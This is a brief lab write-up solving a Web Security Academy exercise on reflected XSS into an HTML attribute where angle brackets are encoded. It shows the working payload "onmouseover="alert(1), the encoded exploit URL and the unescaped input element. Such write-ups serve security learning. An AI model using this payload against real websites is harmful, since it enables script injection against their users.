# Reflected XSS into attribute with angle brackets HTML-encoded

This one is more normal, the only different is that is we have to use the property onmouseover because it is escaping html tags.

### Payload

```
"onmouseover="alert(1)
```

Url

```
https://0a32009a04a470dd813fbb5700c3009a.web-security-academy.net/?search=%22onmouseover%3D%22alert%281%29
```

And it works because the input is reflecting the value ad not escaping the “

```
<input type="text" placeholder="Search the blog..." name="search" value="asd">
```
